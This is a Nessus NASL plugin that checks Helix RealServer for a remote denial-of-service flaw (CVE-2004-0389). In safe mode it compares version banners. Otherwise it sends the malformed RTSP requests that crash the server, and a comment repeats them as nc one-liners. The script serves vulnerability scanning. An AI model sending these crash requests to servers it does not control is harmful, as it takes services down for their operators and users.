#
# Copyright (C) 2004 Tenable Network Security
#

if(description)
{
 script_id(12210);
 script_bugtraq_id(10157);
 script_cve_id("CVE-2004-0389");
 script_version ("$Revision: 1.4 $");
 
 name["english"] = "Helix RealServer Remote DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
RealServer versions prior to 9.0.3 are vulnerable to
a trivial remote Denial of Service (DoS) attack. 

See also : http://www.idefense.com/application/poi/display?type=vulnerabilities

Solution: Install patches from vendor
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "RealServer and Helix Server remote DoS";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("find_service2.nasl");
 script_require_ports("Services/rtsp", 554);
 exit(0);
}


# start script

port = get_kb_item("Services/rtsp");
if(!port)port = 554;

if (safe_checks()) {
     if (get_port_state(port)) {
         soc = open_sock_tcp(port);
         if (soc) {
             data = string("OPTIONS * RTSP/1.0\r\n\r\n");
             send(socket:soc, data:data);
             header = recv(socket:soc, length:1024);
             if(("RTSP/1" >< header) && ("Server:" >< header)) {
                 server = egrep(pattern:"Server:",string:header);
                 if( (egrep(pattern:"Version [0-8]\.[0-9]", string:server)) ||
                       (egrep(pattern:"Version 9\.0\.[0-2]", string:server)) ) {
                            security_hole(port);
                 }
            }
        close(soc);
        }
     }
} else {
    # per idefense adivisory
    # $ echo -e "GET_PARAMETER / RTSP/1.0\n\n" | nc -v localhost 554
    # $ echo -e "DESCRIBE / RTSP/1.0\nSession:\n\n" | nc -v localhost 554
    req[0] = string("GET_PARAMETER / RTSP/1.0\n\n");
    req[1] = string("DESCRIBE / RTSP/1.0\nSession:\n\n");
    req[2] = string("GET / RTSP/1.0\n\n");
    for (i=0; req[i]; i++) {
        soc = open_sock_tcp(port);
        if (!soc) {
            if (i > 0) security_hole(port);
            exit(0);
        }
        send(socket:soc, data:req[i]);
        close(soc);
    }
}
    



